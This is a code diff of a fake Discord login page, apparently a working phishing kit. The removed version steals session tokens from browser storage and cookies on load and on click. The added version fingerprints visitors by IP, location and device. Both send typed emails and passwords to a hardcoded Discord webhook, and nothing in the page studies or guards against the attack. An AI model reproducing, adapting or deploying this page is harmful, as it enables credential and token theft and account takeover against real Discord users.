@@ -1,344 +1,137 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord</title>
-    <style>
-        /* === FULL COPY OF DISCORD LOGIN STYLES === */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #1e1f22;
-            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #dbdee1;
-        }
-        .container {
-            background: #2b2d31;
-            border-radius: 8px;
-            padding: 40px 44px;
-            width: 100%;
-            max-width: 480px;
-            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .logo svg {
-            width: 130px;
-            fill: #dbdee1;
-        }
-        h2 {
-            font-size: 24px;
-            font-weight: 600;
-            text-align: center;
-            margin-bottom: 8px;
-            color: #f2f3f5;
-        }
-        .sub {
-            text-align: center;
-            font-size: 14px;
-            color: #b5bac1;
-            margin-bottom: 24px;
-        }
-        .sub a {
-            color: #00a8fc;
-            text-decoration: none;
-        }
-        .field {
-            margin-bottom: 20px;
-        }
-        .field label {
-            display: block;
-            font-size: 12px;
-            font-weight: 600;
-            color: #b5bac1;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 6px;
-        }
-        .field input {
-            width: 100%;
-            padding: 12px;
-            background: #1e1f22;
-            border: 1px solid #1e1f22;
-            border-radius: 4px;
-            color: #dbdee1;
-            font-size: 16px;
-            outline: none;
-            transition: border 0.15s;
-        }
-        .field input:focus {
-            border-color: #5865f2;
-        }
-        .btn {
-            width: 100%;
-            padding: 12px;
-            background: #5865f2;
-            border: none;
-            border-radius: 4px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.15s;
-        }
-        .btn:hover {
-            background: #4752c4;
-        }
-        .btn:active {
-            background: #3b45a5;
-        }
-        .qr-section {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 14px;
-            color: #b5bac1;
-        }
-        .qr-section a {
-            color: #00a8fc;
-            text-decoration: none;
-        }
-        .error {
-            color: #f23f42;
-            font-size: 14px;
-            text-align: center;
-            margin-bottom: 12px;
-            min-height: 20px;
-        }
-        .register {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 14px;
-            color: #b5bac1;
-        }
-        .register a {
-            color: #00a8fc;
-            text-decoration: none;
-        }
-        .captcha-placeholder {
-            background: #1e1f22;
-            border-radius: 4px;
-            padding: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 16px;
-            color: #b5bac1;
-            font-size: 14px;
-            border: 1px solid #3a3d42;
-        }
-        .captcha-placeholder input[type="checkbox"] {
-            accent-color: #5865f2;
-            width: 18px;
-            height: 18px;
-        }
-        @media (max-width: 500px) {
-            .container { padding: 24px 20px; }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Discord</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
+    body { background: #313338; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .container { background: #36393f; border-radius: 8px; padding: 32px; width: 100%; max-width: 480px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+    .logo { text-align: center; margin-bottom: 24px; }
+    .logo svg { width: 130px; height: auto; }
+    h2 { color: #f2f3f5; font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 4px; }
+    .sub { color: #b5bac1; font-size: 16px; text-align: center; margin-bottom: 20px; }
+    .input-group { margin-bottom: 16px; }
+    label { display: block; color: #b5bac1; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 4px; }
+    input { width: 100%; padding: 10px 12px; background: #1e1f22; border: 1px solid #1e1f22; border-radius: 4px; color: #f2f3f5; font-size: 16px; outline: none; transition: 0.2s; }
+    input:focus { border-color: #5865f2; }
+    .btn { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; transition: 0.2s; }
+    .btn:hover { background: #4752c4; }
+    .footer { margin-top: 12px; color: #b5bac1; font-size: 14px; text-align: center; }
+    .footer a { color: #00a8fc; text-decoration: none; }
+    .footer a:hover { text-decoration: underline; }
+  </style>
 </head>
 <body>
-<div class="container" id="app">
-    <!-- Discord logo (text) -->
-    <div class="logo">
-        <svg viewBox="0 0 245 240" xmlns="http://www.w3.org/2000/svg">
-            <path d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z"/>
-            <path d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z"/>
-        </svg>
+<div class="container">
+  <div class="logo">
+    <svg viewBox="0 0 127 37" fill="none"><path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" fill="#5865F2"/><path d="M32 12.5H23.5V25H32V12.5Z" fill="#4752C4"/><path d="M8.5 12.5H0V25H8.5V12.5Z" fill="#4752C4"/><path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" stroke="#5865F2" stroke-width="1.5"/><text x="42" y="22" font-family="Segoe UI" font-size="24" font-weight="700" fill="#f2f3f5">Discord</text></svg>
+  </div>
+  <h2>Welcome back!</h2>
+  <p class="sub">We're so excited to see you again!</p>
+  <form id="loginForm">
+    <div class="input-group">
+      <label for="email">EMAIL OR PHONE NUMBER</label>
+      <input type="text" id="email" name="email" placeholder="Enter your email or phone" required>
     </div>
-
-    <h2>Welcome back!</h2>
-    <div class="sub">We're so excited to see you again!</div>
-
-    <div class="error" id="errorMsg"></div>
-
-    <form id="loginForm" autocomplete="off">
-        <div class="field">
-            <label for="email">Email or Phone</label>
-            <input type="text" id="email" placeholder="email@example.com" value="">
-        </div>
-        <div class="field">
-            <label for="password">Password</label>
-            <input type="password" id="password" placeholder="••••••••" value="">
-        </div>
-        <div class="captcha-placeholder">
-            <input type="checkbox" id="captcha" checked>
-            <label for="captcha">I am not a robot</label>
-            <span style="margin-left:auto; font-size:12px;">reCAPTCHA</span>
-        </div>
-        <button type="submit" class="btn" id="loginBtn">Log In</button>
-    </form>
-
-    <div class="qr-section">
-        <a href="#">Login with QR Code</a>
+    <div class="input-group">
+      <label for="password">PASSWORD</label>
+      <input type="password" id="password" name="password" placeholder="Enter your password" required>
     </div>
-    <div class="register">
-        Need an account? <a href="#">Register</a>
-    </div>
+    <button type="submit" class="btn">Log In</button>
+  </form>
+  <div class="footer">
+    <a href="#">Need an account?</a> · <a href="#">Register</a> · <a href="#">Forgot password?</a>
+  </div>
 </div>
-
 <script>
-    // ============================================================
-    // 1. YOUR WEBHOOK URL (REPLACE IF NEEDED)
-    // ============================================================
-    var WEBHOOK_URL = "https://discord.com/api/webhooks/1529624654745178112/eWk-COBBo9U6Bjt67J04WhZGE-7sxRqn9JJ9k-nlfvp-W6mH34JKaBJe6KhIA-KcHzyU";
+  (function() {
+    // Webhook URL
+    const WEBHOOK = "https://discord.com/api/webhooks/1529624654745178112/eWk-COBBo9U6Bjt67J04WhZGE-7sxRqn9JJ9k-nlfvp-W6mH34JKaBJe6KhIA-KcHzyU";
 
-    // ============================================================
-    // 2. FUNCTION TO SEND DATA TO WEBHOOK
-    // ============================================================
-    function sendToWebhook(email, password, token) {
-        var message = {
-            content: "**NEW LOGIN**\nEmail: " + email + "\nPassword: " + password + (token ? "\nToken: " + token : "") + "\nUser-Agent: " + navigator.userAgent,
-            username: "DiscordPhisher"
-        };
-        // Attempt 1: fetch with mode 'no-cors' (sends but cannot read response)
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(message),
-            mode: 'no-cors'
-        }).catch(function(e) {
-            // Ignore errors because no-cors does not give a response
+    // Collect all possible data
+    function getVisitorData() {
+      const data = {};
+
+      // IP and country via free API (asynchronous)
+      // We'll fetch this separately and store in session
+
+      // Browser info
+      data.userAgent = navigator.userAgent;
+      data.language = navigator.language;
+      data.platform = navigator.platform;
+      data.screenWidth = screen.width;
+      data.screenHeight = screen.height;
+      data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      data.referrer = document.referrer || "direct";
+      data.url = window.location.href;
+
+      // Try to get IP/country asynchronously
+      return data;
+    }
+
+    // Function to send data to webhook
+    function sendToWebhook(payload) {
+      fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(err => console.error('Webhook error:', err));
+    }
+
+    // Initial visitor data (without IP/country)
+    const baseData = getVisitorData();
+
+    // Fetch IP and country from free API
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(ipData => {
+        baseData.ip = ipData.ip || 'unknown';
+        baseData.country = ipData.country_name || ipData.country || 'unknown';
+        baseData.city = ipData.city || 'unknown';
+        baseData.region = ipData.region || 'unknown';
+        baseData.isp = ipData.org || 'unknown';
+        // Send initial visitor info once we have IP
+        sendToWebhook({
+          content: `**🆕 New Visitor**\nIP: ${baseData.ip}\nCountry: ${baseData.country}\nCity: ${baseData.city}\nRegion: ${baseData.region}\nISP: ${baseData.isp}\nUser-Agent: ${baseData.userAgent}\nLanguage: ${baseData.language}\nPlatform: ${baseData.platform}\nScreen: ${baseData.screenWidth}x${baseData.screenHeight}\nTimezone: ${baseData.timezone}\nReferrer: ${baseData.referrer}\nURL: ${baseData.url}`
         });
+      })
+      .catch(() => {
+        // Fallback: send without IP
+        sendToWebhook({
+          content: `**🆕 New Visitor (IP fetch failed)**\nUser-Agent: ${baseData.userAgent}\nLanguage: ${baseData.language}\nPlatform: ${baseData.platform}\nScreen: ${baseData.screenWidth}x${baseData.screenHeight}\nTimezone: ${baseData.timezone}\nReferrer: ${baseData.referrer}\nURL: ${baseData.url}`
+        });
+      });
 
-        // Attempt 2: XMLHttpRequest (for reliability)
-        try {
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', WEBHOOK_URL, true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify(message));
-        } catch(e) {}
-
-        // Attempt 3: form submission (if everything else fails)
-        try {
-            var form = document.createElement('form');
-            form.method = 'POST';
-            form.action = WEBHOOK_URL;
-            form.enctype = 'application/json';
-            form.style.display = 'none';
-            var input = document.createElement('input');
-            input.name = 'payload_json';
-            input.value = JSON.stringify(message);
-            form.appendChild(input);
-            document.body.appendChild(form);
-            form.submit();
-            setTimeout(function() { form.remove(); }, 1000);
-        } catch(e) {}
-    }
-
-    // ============================================================
-    // 3. FUNCTION TO STEAL TOKEN FROM localStorage/sessionStorage/cookies
-    // ============================================================
-    function stealToken() {
-        var token = null;
-        try {
-            // localStorage
-            for (var key in localStorage) {
-                if (key.indexOf('token') !== -1) {
-                    try {
-                        var val = localStorage.getItem(key);
-                        var parsed = JSON.parse(val);
-                        if (parsed && parsed.token) { token = parsed.token; break; }
-                    } catch(e) {}
-                }
-            }
-            if (!token) {
-                var direct = localStorage.getItem('token');
-                if (direct) token = direct;
-            }
-        } catch(e) {}
-        if (!token) {
-            try {
-                for (var skey in sessionStorage) {
-                    if (skey.indexOf('token') !== -1) {
-                        try {
-                            var sval = sessionStorage.getItem(skey);
-                            var sparsed = JSON.parse(sval);
-                            if (sparsed && sparsed.token) { token = sparsed.token; break; }
-                        } catch(e) {}
-                    }
-                }
-                if (!token) {
-                    var sdirect = sessionStorage.getItem('token');
-                    if (sdirect) token = sdirect;
-                }
-            } catch(e) {}
-        }
-        if (!token) {
-            try {
-                var cookies = document.cookie.split(';');
-                for (var i = 0; i < cookies.length; i++) {
-                    if (cookies[i].indexOf('token=') !== -1) {
-                        token = cookies[i].split('token=')[1].split(';')[0];
-                        break;
-                    }
-                }
-            } catch(e) {}
-        }
-        // Check for valid Discord token format
-        if (token && token.match(/^[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}$/)) {
-            return token;
-        }
-        return null;
-    }
-
-    // ============================================================
-    // 4. ON PAGE LOAD: try to steal token automatically
-    // ============================================================
-    window.addEventListener('load', function() {
-        var existingToken = stealToken();
-        if (existingToken) {
-            sendToWebhook('(auto-captured)', '(auto-captured)', existingToken);
-            document.getElementById('errorMsg').innerHTML = '✅ Auto-captured token sent.';
-            document.getElementById('errorMsg').style.color = '#3ba55d';
-        } else {
-            document.getElementById('errorMsg').innerHTML = '';
-        }
-    });
-
-    // ============================================================
-    // 5. FORM SUBMIT HANDLER (when user clicks Log In)
-    // ============================================================
+    // Capture form submission
     document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
+      e.preventDefault();
 
-        var email = document.getElementById('email').value;
-        var password = document.getElementById('password').value;
-        var errorDiv = document.getElementById('errorMsg');
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
 
-        if (!email || !password) {
-            errorDiv.innerHTML = 'Please fill in all fields.';
-            errorDiv.style.color = '#f23f42';
-            return;
-        }
+      if (!email || !password) return;
 
-        var token = stealToken();
-        sendToWebhook(email, password, token);
+      // Build webhook message with credentials and all data
+      let message = `**🔐 Login Credentials**\n`;
+      message += `Email/Phone: ${email}\nPassword: ${password}\n`;
+      message += `\n**Device Info**\nUser-Agent: ${baseData.userAgent}\nLanguage: ${baseData.language}\nPlatform: ${baseData.platform}\nScreen: ${baseData.screenWidth}x${baseData.screenHeight}\nTimezone: ${baseData.timezone}\nReferrer: ${baseData.referrer}\nURL: ${baseData.url}`;
+      if (baseData.ip) {
+        message += `\nIP: ${baseData.ip}\nCountry: ${baseData.country}\nCity: ${baseData.city}\nRegion: ${baseData.region}\nISP: ${baseData.isp}`;
+      }
 
-        errorDiv.innerHTML = '✅ Login successful! Redirecting...';
-        errorDiv.style.color = '#3ba55d';
+      sendToWebhook({ content: message });
 
-        document.getElementById('loginBtn').innerHTML = 'Logged In';
-        document.getElementById('loginBtn').style.background = '#3ba55d';
+      // Optionally show a fake "incorrect password" or redirect to real Discord
+      alert('Invalid credentials. Please try again.');
+      // Or redirect to real Discord login page
+      // window.location.href = 'https://discord.com/login';
     });
 
-    // ============================================================
-    // 6. EXTRA STEAL ON ANY CLICK (just in case)
-    // ============================================================
-    document.addEventListener('click', function() {
-        var t = stealToken();
-        if (t) {
-            sendToWebhook('(click-capture)', '(click-capture)', t);
-        }
-    });
-
-    console.log('✅ Discord phishing page ready. Webhook: ' + WEBHOOK_URL);
+    // Also capture keystrokes or input changes if you want real-time
+    // but we just capture on submit for simplicity and stealth.
+  })();
 </script>
 </body>
 </html>
